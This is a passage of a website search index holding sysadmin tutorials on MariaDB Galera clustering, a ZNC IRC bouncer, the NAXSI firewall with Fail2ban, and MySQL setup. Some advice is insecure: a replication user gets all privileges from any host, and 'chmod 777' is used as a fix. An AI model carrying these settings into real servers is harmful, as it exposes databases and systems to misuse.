[mysqlhotcopy] interactive-timeout # # * IMPORTANT: Additional settings that can override those from this file! # The files must end with '.cnf', otherwise they'll be ignored. # !includedir /etc/mysql/conf.d/ Now we’ll delete the log files because we just changed their configuration (or we won’t be able to start the instance) and be able to start our MariaDB service:\nrm /var/lib/mysql/ib_logfile* service mysql start Galera linkHere’s the configuration to apply for a cluster on the same site:\n# MariaDB-specific config file. # Read by /etc/mysql/my.cnf [client] # Default is Latin1, if you need UTF-8 set this (also in server section) #default-character-set = utf8 [mysqld] # # * Character sets # # Default is Latin1, if you need UTF-8 set all this (also in client section) # #character-set-server = utf8 #collation-server = utf8_general_ci #character_set_server = utf8 #collation_server = utf8_general_ci # Load Galera Cluster wsrep_provider = /usr/lib/galera/libgalera_smm.so wsrep_cluster_name='mariadb_cluster' wsrep_node_name=node2 wsrep_node_address=\"10.0.0.2\" wsrep_cluster_address = 'gcomm://10.0.0.1,10.0.0.2,10.0.0.3,10.0.0.4' wsrep_retry_autocommit = 0 wsrep_sst_method = rsync wsrep_provider_options=\"gcache.size = 1G; gcache.name = /tmp/galera.cache\" #wsrep_replication_myisam = 1 #wsrep_sst_receive_address = #wsrep_notify_cmd=\"script.sh\" # Other mysqld options binlog_format = ROW innodb_autoinc_lock_mode = 2 innodb_flush_log_at_trx_commit = 2 innodb_locks_unsafe_for_binlog = 1 wsrep_cluster_name: the name of the Galera cluster. Use this especially if you have multiple Galera clusters in the same subnet to prevent nodes from entering the wrong cluster. wsrep_node_name: the name of the machine where this configuration file is located. You’ll understand that you absolutely must avoid duplicates (especially for debugging ;-)) wsrep_node_address: IP address of the current node (same warning as the previous line) wsrep_cluster_address: list of cluster members that can be master (separated by commas). wsrep_provider_options: enables additional options. gcache allows storing data to transfer to other nodes. Default is 128M, it’s advised to increase this value. wsrep_retry_autocommit: defines the number of times a query should be retried in case of conflict. wsrep_sst_method: the data exchange method. Rsync is currently the fastest. wsrep_replication_myisam: enables replication of MyISAM data (no transaction management…so avoid it!) wsrep_sst_receive_address: forces the use of a certain address for remote hosts to connect (resolves VIP problems) wsrep_notify_cmd: allows executing a script for each Galera event (node state change) binlog_format: defines the log format in ROW mode innodb_autoinc_lock_mode: changes the lock behavior innodb_flush_log_at_trx_commit: performance optimization info Adapt the wsrep_node_name and wsrep_cluster_address lines to your respective machines. The above configuration is applicable to all nodes except the master (node 1). The master should have the identical configuration with the only difference being this line:\nwsrep_cluster_address = 'gcomm://' warning It’s important that only one machine has the ‘gcomm://’ configuration, as this initializes the cluster. Geo cluster linkIt’s possible to set up a geo cluster, but the disadvantage is that when there’s a network outage exceeding the specified timeouts, one of the clusters will have to completely resynchronize. Here’s the line to configure to modify these timeouts:\n[...] wsrep_provider_options = \"evs.keepalive_period = PT3S; evs.inactive_check_period = PT10S; evs.suspect_timeout = PT30S; evs.inactive_timeout = PT1M; evs.install_timeout = PT1M\" [...] If you use the ‘wsrep_sst_receive_address’ option, you’ll need to add a parameter to this line (ist.recv_addr) with the same IP as the ‘wsrep_sst_receive_address’ option:\n[...] wsrep_provider_options = \"evs.keepalive_period = PT3S; evs.inactive_check_period = PT10S; evs.suspect_timeout = PT30S; evs.inactive_timeout = PT1M; evs.install_timeout = PT1M; ist.recv_addr = \" [...] Replication methods linkThere are several solutions for data transfers between nodes. In the example above, we used rsync. When a machine requests a donor (another machine) to receive data, transactions are blocked for the donor during the data exchange period with the receiver!!!\nwarning If you use a load balancer, you’ll need to remove the donor node during this period. This block can be limited by using the xtrabackup method.\nmysqldump linkSST (State Snapshot Transfer) will allow complete exchanges (only complete, not incremental). So you need to create a user on all machines:\ngrant all on *.* to 'sst_user'@'%' identified by 'sst_password'; Then modify the configuration so that the user and password match:\n[...] wsrep_sst_auth = 'sst_user:sst_password' [...] So when we add a new node, we can see that a node has become a donor:\nMariaDB [(NONE)]\u003e SHOW global STATUS LIKE 'wsrep%stat%'; +---------------------------+--------------------------------------+ | Variable_name | VALUE | +---------------------------+--------------------------------------+ | wsrep_local_state_uuid | 3e10ea72-f2b9-11e2-0800-4b821a7d26d5 | | wsrep_local_state | 2 | | wsrep_local_state_comment | Donor/Desynced | | wsrep_cluster_state_uuid | 3e10ea72-f2b9-11e2-0800-4b821a7d26d5 | | wsrep_cluster_status | PRIMARY | +---------------------------+--------------------------------------+ 5 ROWS IN SET (0.00 sec) We also see that the wsrep_local_state value changes to 4 when the process is complete.\ninfo The problem with this method is that it doesn’t handle IST (Incremental State Transfer). Everything must be transferred in case of problems, not just the incremental data. You need to look at rsync or xtrabackup methods to be able to do IST. Rsync linkThis is a very efficient method! The major disadvantage is that it doesn’t allow hot transfers. Here’s how to configure SST:\n[...] wsrep_sst_method = rsync [...] The data must no longer be accessed by MariaDB for this to work properly. Another prerequisite is the presence of rsync on the servers.\nXtraBackup linkXtraBackup is the best method today. It allows transfers while minimizing lock time to just a few seconds. To use this method, we need to install XtraBackup.\nTo install it on Debian, it’s very simple, we’ll add its repository:\napt-key adv --keyserver keys.gnupg.net --recv-keys 1C4CBDCDCD2EFD2A Create this file to add the repository:\ndeb http://repo.percona.com/apt VERSION main deb-src http://repo.percona.com/apt VERSION main Update and install:\naptitude update aptitude install xtrabackup Then we can configure our nodes to use this method:\n[...] wsrep_sst_method = xtrabackup [...] Specifying a donor linkFor replication, if you want to dedicate a machine as a donor (and possibly for backups) from a server:\nSET global wsrep_sst_donor= This solves the load balancer issue mentioned above and avoids blocks during a backup.\nOtherwise, you can specify it directly for node integration:\nmysqld --wsrep_cluster_address='gcomm://' --wsrep_sst_donor='' info If you start MariaDB twice in a row without running a Galera sync at least once, the second time it will do a complete sync. Usage linkBefore using, you need to understand the principle. When we start our MariaDB instances, we’ll end up in this configuration (I deliberately didn’t draw all the communication arrows to avoid clutter, but all nodes talk to each other):\nNode 1 initializes the cluster with the empty gcomm value. The other nodes connect to node 1 and exchange their data to have the same data level everywhere Creating the cluster linkGo to node 1 to create the cluster. We’ll start it with an empty cluster address, which will indicate its creation:\nservice mysql start --wsrep_cluster_address='gcomm://' or\nmysqld --wsrep_cluster_address='gcomm://' Adding nodes to the cluster linkTo join nodes to the newly created cluster, it’s simple:\nservice mysql start --wsrep_cluster_address='gcomm://' or\nmysqld --wsrep_cluster_address='gcomm://' Put the IP of node 1 to connect to it. You can also simply start the MariaDB service, as we have a working configuration:\nservice mysql start If you can’t reach the master, run this command in mysql on the master to make sure it’s properly started:\nSET global wsrep_cluster_address='gcomm://'; info You can use IPs or DNS names. Checking the cluster status linkTo check the cluster status, here’s the command to run in MariaDB:\nMariaDB [(none)]\u003e SHOW STATUS LIKE 'wsrep_%'; +--------------------------+----------------------+ | Variable_name | Value | +--------------------------+----------------------+ | wsrep_cluster_conf_id | 18446744073709551615 | | wsrep_cluster_size | 0 | | wsrep_cluster_state_uuid | | | wsrep_cluster_status | Disconnected | | wsrep_connected | OFF | | wsrep_local_index | 18446744073709551615 | | wsrep_provider_name | | | wsrep_provider_vendor | | | wsrep_provider_version | | | wsrep_ready | ON | +--------------------------+----------------------+ 10 rows in set (0.01 sec) Here I only have my main server running. No other nodes have joined the cluster yet. But when I add some:\n\u003e mysql -uroot -p -e \"SHOW STATUS LIKE 'wsrep_%';\" +----------------------------+----------------------------------------------------------------------------+ | Variable_name | Value | +----------------------------+----------------------------------------------------------------------------+ | wsrep_local_state_uuid | 9e9f8568-a025-11e2-0800-be0dc874ac98 | | wsrep_protocol_version | 4 | | wsrep_last_committed | 0 | | wsrep_replicated | 0 | | wsrep_replicated_bytes | 0 | | wsrep_received | 12 | | wsrep_received_bytes | 639 | | wsrep_local_commits | 0 | | wsrep_local_cert_failures | 0 | | wsrep_local_bf_aborts | 0 | | wsrep_local_replays | 0 | | wsrep_local_send_queue | 0 | | wsrep_local_send_queue_avg | 0.000000 | | wsrep_local_recv_queue | 0 | | wsrep_local_recv_queue_avg | 0.000000 | | wsrep_flow_control_paused | 0.000000 | | wsrep_flow_control_sent | 0 | | wsrep_flow_control_recv | 0 | | wsrep_cert_deps_distance | 0.000000 | | wsrep_apply_oooe | 0.000000 | | wsrep_apply_oool | 0.000000 | | wsrep_apply_window | 0.000000 | | wsrep_commit_oooe | 0.000000 | | wsrep_commit_oool | 0.000000 | | wsrep_commit_window | 0.000000 | | wsrep_local_state | 4 | | wsrep_local_state_comment | Synced | | wsrep_cert_index_size | 0 | | wsrep_causal_reads | 0 | | wsrep_incoming_addresses | 10.0.0.1:3306,10.0.0.2:3306,10.0.0.3:3306,10.0.0.4:3306 | | wsrep_cluster_conf_id | 2 | | wsrep_cluster_size | 4 | | wsrep_cluster_state_uuid | 9e9f8568-a025-11e2-0800-be0dc874ac98 | | wsrep_cluster_status | Primary | | wsrep_connected | ON | | wsrep_local_index | 0 | | wsrep_provider_name | Galera | | wsrep_provider_vendor | Codership Oy | | wsrep_provider_version | 23.2.4(r147) | | wsrep_ready | ON | +----------------------------+----------------------------------------------------------------------------+ Here I can clearly see my 4 master nodes :-)\nGarbd (quorum) linkTo avoid split brains (cluster inconsistencies), it’s advisable to use a tool provided with the Galera cluster that acts as a cluster quorum, especially if you’re in 2-node mode (and that’s generally the main advantage). Here’s a use case:\n,---------. | garbd | `---------' ,---------. | ,---------. | clients | | | clients | `---------' | `---------' \\ | / \\ ,---. / (' `) ( WAN ) (. ,) / `---' \\ / \\ ,---------. ,---------. | node1 | | node2 | | node3 | | node4 | `---------' `---------' Data Center 1 Data Center 2 You’ll need to use the garbd service. It’s installed by default but simply not activated. To configure it, we’ll edit its configuration:\n# Copyright (C) 2012 Coedership Oy # This config file is to be sourced by garb service script. # A space-separated list of node addresses (address[:port]) in the cluster GALERA_NODES=\"10.0.0.1:4567 10.0.0.2:4567 10.0.0.3:4567 10.0.0.4:4567\" # Galera cluster name, should be the same as on the rest of the nodes. GALERA_GROUP=\"mariadb_cluster\" # Optional Galera internal options string (e.g. SSL settings) # see http://www.codership.com/wiki/doku.php?id=galera_parameters # GALERA_OPTIONS=\"\" # Log file for garbd. Optional, by default logs to syslog # LOG_FILE=\"\" Adapt GALERA_NODES with the list of all your nodes and GALERA_GROUP with the name of the Galera cluster. Now we just need to activate it at machine startup and start the service:\nupdate-rc.d -f garb defaults service garb start Now, on one of your nodes, you’ll see there’s a new node, which is actually just the quorum:\nMariaDB [(none)]\u003e SHOW STATUS LIKE 'wsrep_cluster_size'; +--------------------+-------+ | Variable_name | Value | +--------------------+-------+ | wsrep_cluster_size | 5 | +--------------------+-------+ Backups and restorations linkFor backups, there are several methods and Xtrabackup is again one of the favorites.\ninfo Just like when a new node joins the cluster and blocks the donor’s transactions, it’s the same for backups, but only for MyISAM! If you only use InnoDB and use Xtrabackup, there will be no transaction locks and therefore no special node needed for backups!\nInstallation linkTo install on Debian, it’s very simple, we’ll add its repository:\napt-key adv --keyserver keys.gnupg.net --recv-keys 1C4CBDCDCD2EFD2A Create this file to add the repository:\ndeb http://repo.percona.com/apt VERSION main deb-src http://repo.percona.com/apt VERSION main Update and install:\naptitude update aptitude install xtrabackup Usage linkBackup linkTo back up a Galera cluster and allow incremental backup while blocking the node that will perform the backups for only a few seconds:\ninnobackupex --galera-info --user=xxxxx --password=xxxx The ‘galera-info’ option prevents problems during the uuid request (which will always return 0). If this option is not specified, incremental restorations won’t be possible.\ninfo For databases containing only InnoDB tables, it’s possible to have no blocking at all during the lock by adding the ‘–no-lock’ option. Restoration linkDuring restoration, one of the nodes will have blocked transactions after the Xtrabackup restoration, while the differential is being applied. To restore, copy the backup files to the MariaDB directory:\ncp -Rf /var/lib/mysql/ chown -Rf mysql. /var/lib/mysql/ You can specify the donor (optional), then check the backup position:\n\u003e cat /xtrabackup_galera_info cfa9b8f1-f37b-11e2-0800-b37f8ac5092c:1 And integrate the node into the cluster by specifying the position to avoid it getting a complete backup:\nservice mysql start --wsrep_cluster_address='gcomm://' --wsrep_start_position=\"cfa9b8f1-f37b-11e2-0800-b37f8ac5092c:1\" or\nmysqld --wsrep_cluster_address='gcomm://' --wsrep_start_position=\"cfa9b8f1-f37b-11e2-0800-b37f8ac5092c:1\" Recovery and maintenance linkAutomatic method linkYou don’t need to worry about replication if a node other than the master (node1) fails. Once repaired and powered on, it will automatically reconnect to node 1 and catch up. However, in case of a problem with node 1:\nThe other nodes will continue to communicate with each other and wait for the master to return. Once the master is turned back on, you’ll need to tell it another node to which it should connect to continue synchronization:\nWhether you want to force a reconnection or perform maintenance on the master node, it’s advisable to redirect the other servers to another master to avoid outages:\nSET GLOBAL wsrep_cluster_address='gcomm://10.0.0.2'; You can then check the master node on your MariaDB instances:\nMariaDB [(none)]\u003e SHOW VARIABLES LIKE 'wsrep_cluster_address'; +-----------------------+-----------------------+ | Variable_name | Value | +-----------------------+-----------------------+ | wsrep_cluster_address | gcomm://10.0.0.2 | +-----------------------+-----------------------+ I’ve also tested violently shutting down any node and turning it back on. Once integrated into the cluster, it properly retrieves all the differential information. I had no corruption problems. The only issues I encountered were with MariaDB startup and lock problems as explained in the FAQ.\nManual method linkIt’s possible to update a node from a delta between an up-to-date version and one that’s behind. To do this, check the version in which one of the up-to-date nodes is:\nSHOW global STATUS LIKE 'wsrep%'; +----------------------------+---------------------------------------+ | Variable_name | VALUE | +----------------------------+---------------------------------------+ | wsrep_local_state_uuid | 3e10ea72-f2b9-11e2-0800-4b821a7d26d5 | | wsrep_protocol_version | 4 | | wsrep_last_committed | 6 | Here we can see the uuid number and the position of the last commit (wsrep_last_committed).\nwarning The following command should only be used on a turned off server or you risk losing data on it!!! With the server off, it’s possible to retrieve the position of the last commit:\n\u003e mysqld --wsrep_recover=1 130722 15:44:53 InnoDB: The InnoDB memory heap is disabled 130722 15:44:53 InnoDB: Mutexes and rw_locks use GCC atomic builtins 130722 15:44:53 InnoDB: Compressed tables use zlib 1.2.7 130722 15:44:53 InnoDB: Using Linux native AIO 130722 15:44:53 InnoDB: Initializing buffer pool, size = 256.0M 130722 15:44:53 InnoDB: Completed initialization of buffer pool 130722 15:44:53 InnoDB: highest supported file format is Barracuda. 130722 15:44:53 InnoDB: Waiting for the background threads to start 130722 15:44:54 Percona XtraDB (http://www.percona.com) 1.1.8-29.3 started; log sequence number 1603853 130722 15:44:54 [Note] Plugin 'FEEDBACK' is disabled. 130722 15:44:54 [Note] WSREP: Recovered position: 3e10ea72-f2b9-11e2-0800-4b821a7d26d5:4 130722 15:44:54 InnoDB: Starting shutdown... 130722 15:44:55 InnoDB: Shutdown completed; log sequence number 1603853 130722 15:44:55 [Note] mysqld: Shutdown complete Then we can restart with the delta from this last commit:\nmysqld --wsrep_start_position=: or\nmysqld --wsrep_start_position=3e10ea72-f2b9-11e2-0800-4b821a7d26d5:4 The delta is then performed and the server is now at position 6.\nForce a node to resynchronize linkIf you really don’t know what a node has and you want to completely resynchronize it because you’re unsure about its data, just delete the MariaDB content and restart it:\nservice mysql stop rm -Rf /var/lib/mysql/* service mysql start All data will then resynchronize.\nwarning This can take some time if your database is large or if the bandwidth between nodes is low. Split brain linkWhen you have one or more nodes in a split brain state, it’s possible to continue using the cluster and discard all changes from the other down nodes so they’ll do a complete sync when they start back up. On a ‘primary’ server:\nSET global wsrep_provider_options = 'pc.bootstrap=1'; SET global wsrep_provider_options = 'pc.ignore_quorum=0'; pc.bootstrap: takes control of the other nodes in the cluster and indicates that it’s the master pc.ignore_quorum: allows splitting nodes and having a split brain Then restart your other servers so they synchronize.\nwarning Once the cluster is restored, you MUST set these variables back to False to avoid future split brains that you can’t recover from!!! FAQ linkOne of my MariaDB services refuses to start after shutting it down linkIt can happen that when you turn off a MariaDB service, the lock files aren’t properly released and the rsync service is still running. To clean everything up (without completely restarting the machine), follow these steps:\nMake sure MariaDB is no longer running: service mysql stop ps aux | grep mysql If it’s still running, kill the process! Check that the rsync process is no longer running and kill it if it is Delete the lock files: rm -f /var/run/mysqld/mysqld.sock Check that the directory for storing the pid exists, otherwise create it: if [ ! -d /var/run/mysqld ] ; then mkdir /var/run/mysqld ; chown mysql. /var/run/mysqld ; fi You can now start the service, it should work: service mysql start Otherwise check the logs (/var/log/syslog)\n/dev/stderr: Permission denied linkIf you have this problem, it’s due to a Galera bug that incorrectly redirects its error output:\n/usr//bin/wsrep_sst_common: line 94: /dev/stderr: Permission denied To fix the problem, simply set the correct permissions on the error output:\nchmod 777 /proc/self/fd/2 References link http://www.codership.com/wiki/doku.php?id=galera_deployment http://www.severalnines.com/galera-configurator/ http://www.severalnines.com/blog/understanding-gcache-galera http://www.codership.com/wiki/doku.php?id=sst_mysql http://www.codership.com/wiki/doku.php?id=galera_node_fsm http://www.sebastien-han.fr/blog/2012/04/01/mysql-multi-master-replication-with-galera/ MariaDB: high performances MariaDB MySQL Advanced File:Galera1_src.vsdx - File:Galera2_src.vsdx - File:Galera3_src.vsdx "
            }
        );
    index.add(
            {
                id:  184 ,
                href: "\/ZNC:_use_a_bouncer_to_get_history\/",
                title: "ZNC: Use a Bouncer to Get History",
                description: "How to install and configure ZNC as an IRC bouncer to maintain connection and keep history when you're offline.",
                content: " Software version 0.206-2 Operating System Debian 7 Website ZNC Website Last Update 14/04/2014 Introduction linkA BNC1 (short for bouncer) is a piece of software that is used to relay traffic and connections in computer networks, much like a proxy. Using a BNC allows a user to hide the original source of the user’s connection, providing privacy as well as the ability to route traffic through a specific location. A BNC can also be used to hide the true target to which a user connects.\nI was fed up to launch every day a ssh to connect to an external server, on which I had a tmux running a weechat to get IRC history. 2 problems here:\nSometimes, I forgot to connect on it and missed some messages It was not integrated to Pidgin (what I use for any IM protocol) So I decided to setup a bounce IRC with ZNC!\nInstallation linkEasy as it is integrated to Debian:\naptitude install znc Configuration linkFor the configuration, it’s not complicated, you just have to follow the wizard on launching znc:\n\u003e znc --makeconf [ ** ] Building new config [ ** ] [ ** ] First let's start with some global settings... [ ** ] [ ?? ] What port would you like ZNC to listen on? (1025 to 65535): 12345 [ ?? ] Would you like ZNC to listen using SSL? (yes/no) [no]: [ ?? ] Would you like ZNC to listen using ipv6? (yes/no) [yes]: no [ ?? ] Listen Host (Blank for all ips): [ ok ] Verifying the listener... Up to you to choose what you want for the network part.\n[ ** ] [ ** ] -- Global Modules -- [ ** ] [ ** ] +-----------+----------------------------------------------------------+ [ ** ] | Name | Description | [ ** ] +-----------+----------------------------------------------------------+ [ ** ] | partyline | Internal channels and queries for users connected to znc | [ ** ] | webadmin | Web based administration module | [ ** ] +-----------+----------------------------------------------------------+ [ ** ] And 13 other (uncommon) modules. You can enable those later. [ ** ] [ ?? ] Load global module ? (yes/no) [no]: [ ?? ] Load global module ? (yes/no) [no]: yes Enable at least the webadmin to help you on configuration.\n[ ** ] [ ** ] Now we need to set up a user... [ ** ] ZNC needs one user per IRC network. [ ** ] [ ?? ] Username (AlphaNumeric): username [ ?? ] Enter Password: [ ?? ] Confirm Password: Choose a username and password for you to connect to ZNC.\nNow set global IRC configuration credentials and nicknames:\n[ ?? ] Would you like this user to be an admin? (yes/no) [yes]: [ ?? ] Nick [username]: [ ?? ] Alt Nick [username_]: [ ?? ] Ident [test]: [ ?? ] Real Name [Got ZNC?]: [ ?? ] Bind Host (optional): [ ?? ] Number of lines to buffer per channel [50]: 10000 [ ?? ] Would you like to keep buffers after replay? (yes/no) [no]: yes [ ?? ] Default channel modes [+stn]: [ ** ] Now choose which modules you want to activate:\n[ ** ] -- User Modules -- [ ** ] [ ** ] +-------------+------------------------------------------------------------------------------------------------------------+ [ ** ] | Name | Description | [ ** ] +-------------+------------------------------------------------------------------------------------------------------------+ [ ** ] | admin | Dynamic configuration of users/settings through IRC. Allows editing only yourself if you're not ZNC admin. | [ ** ] | chansaver | Keep config up-to-date when user joins/parts | [ ** ] | keepnick | Keep trying for your primary nick | [ ** ] | kickrejoin | Autorejoin on kick | [ ** ] | nickserv | Auths you with NickServ | [ ** ] | perform | Keeps a list of commands to be executed when ZNC connects to IRC. | [ ** ] | simple_away | Auto away when last client disconnects | [ ** ] +-------------+------------------------------------------------------------------------------------------------------------+ [ ** ] And 36 other (uncommon) modules. You can enable those later. [ ** ] [ ?? ] Load module ? (yes/no) [no]: [ ?? ] Load module ? (yes/no) [no]: yes [ ?? ] Load module ? (yes/no) [no]: yes [ ?? ] Load module ? (yes/no) [no]: yes [ ?? ] Load module ? (yes/no) [no]: yes [ ?? ] Load module ? (yes/no) [no]: [ ?? ] Load module ? (yes/no) [no]: [ ** ] Now configure the IRC server you want to connect onto, with channels etc…:\n[ ** ] -- IRC Servers -- [ ** ] Only add servers from the same IRC network. [ ** ] If a server from the list can't be reached, another server will be used. [ ** ] [ ?? ] IRC server (host only): [ ?? ] IRC server (host only): irc.freenode.net [ ?? ] [irc.freenode.net] Port (1 to 65535) [6667]: [ ?? ] [irc.freenode.net] Password (probably empty): [ ?? ] Does this server use SSL? (yes/no) [no]: [ ** ] [ ?? ] Would you like to add another server for this IRC network? (yes/no) [no]: [ ** ] [ ** ] -- Channels -- [ ** ] [ ?? ] Would you like to add a channel for ZNC to automatically join? (yes/no) [yes]: [ ?? ] Channel name: #myassonthecommode [ ?? ] Would you like to add another channel? (yes/no) [no]: [ ** ] [ ?? ] Would you like to set up another user (e.g. for connecting to another network)? (yes/no) [no]: [ ok ] Writing config [/home/vagrant/.znc/configs/znc.conf]... [ ** ] [ ** ] To connect to this ZNC you need to connect to it as your IRC server [ ** ] using the port that you supplied. You have to supply your login info [ ** ] as the IRC server password like this: user:pass. [ ** ] [ ** ] Try something like this in your IRC client... [ ** ] /server 12345 test: [ ** ] And this in your browser... [ ** ] http://:12345/ [ ** ] [ ?? ] Launch ZNC now? (yes/no) [yes]: [ ok ] Opening Config [/home/vagrant/.znc/configs/znc.conf]... [ ok ] Loading Global Module [webadmin]... [/usr/lib/znc/webadmin.so] [ ok ] Binding to port [12345] using ipv4... [ ** ] Loading user [username] [ ok ] Adding Server [irc.freenode.net 6667 ]... [ ok ] Loading Module [chansaver]... [/usr/lib/znc/chansaver.so] [ ok ] Loading Module [keepnick]... [/usr/lib/znc/keepnick.so] [ ok ] Loading Module [kickrejoin]... [/usr/lib/znc/kickrejoin.so] [ ok ] Loading Module [nickserv]... [/usr/lib/znc/nickserv.so] [ ok ] Forking into the background... [pid: 4305] [ ** ] ZNC 0.206+deb2 - http://znc.in Now it is launched! First thing to do is to kill znc to be in debug mode and understand what’s wrong when you’ll going to add accounts or if it fails to connect:\nznc -D Now open the web interface http://:12345/ and you can finish to configure as it should be. For example in Pidgin, add as IRC server, your ZNC bouncer. Then join a channel that you previously configured into ZNC to get history etc…\nIf you want to get an idea of what a configuration looks like:\n// WARNING // // Do NOT edit this file while ZNC is running! // Use webadmin or *admin instead. // // Buf if you feel risky, you might want to read help on /znc saveconfig and /znc rehash. // Also check http://en.znc.in/wiki/Configuration AnonIPLimit = 10 MaxBufferSize= 500 ProtectWebSessions = true Pass = Nick = AltNick = , Ident = RealName = QuitMsg = ZNC - http://znc.in StatusPrefix = * ChanModes = +stn Buffer = 5000 KeepBuffer = true MultiClients = true DenyLoadMod = false Admin = true DenySetBindHost = false TimestampFormat = [%H:%M:%S] AppendTimestamp = false PrependTimestamp = true TimezoneOffset = 0.00 JoinTries = 10 MaxJoins = 5 IRCConnectEnabled = true Allow = * LoadModule = admin LoadModule = chansaver LoadModule = kickrejoin LoadModule = perform LoadModule = buffextras Server = irc.freenode.net 6667 Key = When finished, kill your znc and relaunch it without debug mode. That’s it :-)\nReferences link http://en.wikipedia.org/wiki/BNC_%28software%29 ↩︎\n"
            }
        );
    index.add(
            {
                id:  185 ,
                href: "\/NAXSI:_integrate_a_WAF_for_Nginx\/",
                title: "NAXSI: Integrate a WAF for Nginx",
                description: "Learn how to set up NAXSI, a Web Application Firewall for Nginx, including installation, configuration, testing, and integration with Fail2ban.",
                content: " Software version 0.50 Operating System Debian 7 Website NAXSI Website Last Update 10/04/2014 Others Dotdeb Introduction linkNAXSI1 means Nginx Anti Xss \u0026 Sql Injection.\nTechnically, it is a third party nginx module, available as a package for many UNIX-like platforms. This module, by default, reads a small subset of simple rules (naxsi_core.rules) containing 99% of known patterns involved in websites vulnerabilities. For example, ‘\u003c’, ‘|’ or ‘drop’ are not supposed to be part of a URI.\nBeing very simple, those patterns may match legitimate queries, it is Naxsi’s administrator duty to add specific rules that will whitelist those legitimate behaviors. The administrator can either add whitelists manually by analyzing nginx’s error log, or (recommended) start the project by an intensive auto-learning phase that will automatically generate whitelisting rules regarding website’s behavior.\nIn short, Naxsi behaves like a DROP-by-default firewall, the only job needed is to add required ACCEPT rules for the target website to work properly.\nInstallation linkTo install NAXSI:\naptitude install nginx-naxsi python-twisted python-mysqldb nginx-naxsi-ui Configuration linkThere are several types of installation and mode. You may for example want:\nIntegrate NAXSI as a frontal proxy Integrate NAXSI directly on your current Nginx web server Global configuration linkIf you want to enable NAXSI module on your Nginx, simply uncomment this line:\n[...] ## # nginx-naxsi config ## # Uncomment it if you installed nginx-naxsi ## include /etc/nginx/naxsi_core.rules; [...] Here is the configuration (/etc/nginx/naxsi.rules):\n# Sample rules file for default vhost. #LearningMode; SecRulesEnabled; #SecRulesDisabled; DeniedUrl \"/RequestDenied\"; ## check rules CheckRule \"$SQL \u003e= 8\" BLOCK; CheckRule \"$RFI \u003e= 8\" BLOCK; CheckRule \"$TRAVERSAL \u003e= 4\" BLOCK; CheckRule \"$EVADE \u003e= 4\" BLOCK; CheckRule \"$XSS \u003e= 8\" BLOCK; LearningMode: this is the learning mode. For a first step, do not activate it SecRulesEnabled: this will load default rules DeniedUrl: where blocked requests should be send (generally used for learning mode) With proxying linkIf you don’t want to touch to your current setup (Apache for example), you can add Nginx as a reverse proxy and add Naxsi with it:\nserver { listen 80 default_server; listen [::]:80 default_server ipv6only=on; root /usr/share/nginx/html; index index.php; # Make site accessible from http://localhost/ server_name localhost; location / { proxy_pass http://localhost:8080/; proxy_set_header Host $http_host; include /etc/nginx/naxsi.rules; } # Only for nginx-naxsi used with nginx-naxsi-ui : process denied requests location /RequestDenied { #proxy_pass http://127.0.0.1:8080; return 500; } } Now restart Nginx!\nWithout proxying linkIf you want to install NAXSI directly on your current Nginx installation, here are the\nserver { listen 80 default_server; listen [::]:80 default_server ipv6only=on; root /usr/share/nginx/html; index index.php; # Make site accessible from http://localhost/ server_name localhost; location / { try_files $uri $uri/ =404; include /etc/nginx/naxsi.rules; } location ~ \\.php$ { fastcgi_index index.php; fastcgi_pass unix:/var/run/php5-fpm.sock; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params; } # Only for nginx-naxsi used with nginx-naxsi-ui : process denied requests location /RequestDenied { #proxy_pass http://127.0.0.1:8080; return 500; } } Now restart Nginx!\nFail2ban integration linkYou can mix to fail2ban to definitively block IPs for attackers. How to do it? First install fail2ban:\naptitude install fail2ban Then add this NAXSI filter:\n[INCLUDES] before = common.conf [Definition] failregex = NAXSI_FMT: ip= ignoreregex = When it will find “NAXSI_FMT: ip=” followed by an IP address, it will inform fail2ban daemon that this filter rule match.\nAnd add a section within /etc/fail2ban/jail.conf with:\n[nginx-naxsi] enabled = true port = http,https filter = nginx-naxsi logpath = /var/log/nginx/*error.log maxretry = 3 It will ask to fail2ban to watch at the Nginx errors logs. Each time the filter will match, it will increment a number since it reaches the maximum. Then fail2ban will ask to iptables to block the IP source.\nTest NAXSI linkAnd try to go to your URL website in adding “?a=%3C” (ex: http://www.deimos.fr/?a=%3C). You should see something like this in your logs:\n2014/04/04 20:13:26 [error] 4256#0: *7 NAXSI_FMT: ip=192.168.0.157\u0026server=192.168.0.84\u0026uri=/\u0026lt;\u0026gt;\u0026learning=0\u0026total_processed=47\u0026total_blocked=1\u0026zone0=URL\u0026id0=1302\u0026var_name0=, client: 192.168.0.157, server: localhost, request: \"GET /%3C%3E HTTP/1.1\", host: \"192.168.0.84\" You can see “NAXSI_FMT” which indicates that NAXSI has correctly blocked it!\nReporting linkYou can generate reporting by installing nx_util:\naptitude install git python-geoip git clone https://github.com/nbs-system/naxsi.git cd naxsi/nx_util/ python setup.py install You’re now ready to generate the report from error logs:\n/usr/local/bin/nx_util.py -c /usr/local/etc/nx_util.conf -v3 -l /var/log/nginx/*error.log -H /usr/share/nginx/html/naxsi.html And if you look at the html result:\nReferences link https://github.com/nbs-system/naxsi ↩︎\n"
            }
        );
    index.add(
            {
                id:  186 ,
                href: "\/MySQL_:_Installation_et_configuration\/",
                title: "MySQL: Installation and Configuration",
                description: "A comprehensive guide for MySQL installation, configuration, and common management tasks including user management, database operations, and troubleshooting.",
                content: " Introduction linkMySQL is a relational SQL database server developed with a focus on high performance. It is multi-threaded, robust, and multi-user. It is open-source software developed under a dual license depending on its use: in an open-source product or in a proprietary product. In the latter case, the license is paid; otherwise, it’s free.\nInstallation linkTo install it, nothing could be simpler:\napt-get install mysql Usage linkI strongly recommend a small built-in MySQL utility to configure MySQL simply and securely. Let’s start:\n$ mysql_secure_installation NOTE: RUNNING ALL PARTS OF THIS SCRIPT IS RECOMMENDED FOR ALL MySQL SERVERS IN PRODUCTION USE! PLEASE READ EACH STEP CAREFULLY! In order to log into MySQL to secure it, we'll need the current password for the root user. If you've just installed MySQL, and you haven't set the root password yet, the password will be blank, so you should just press enter here. Enter current password for root (enter for none): Just press “Enter” because there is no default password\nOK, successfully used password, moving on... Setting the root password ensures that nobody can log into the MySQL root user without the proper authorisation. You already have a root password set, so you can safely answer 'n'. Change the root password? [Y/n] Answer “y” and change the password\nBy default, a MySQL installation has an anonymous user, allowing anyone to log into MySQL without having to have a user account created for them. This is intended only for testing, and to make the installation go a bit smoother. You should remove them before moving into a production environment. Remove anonymous users? [Y/n] Answer “y” to remove anonymous users\nNormally, root should only be allowed to connect from 'localhost'. This ensures that someone cannot guess at the root password from the network. Disallow root login remotely? [Y/n] Answer “y” to not allow root to connect 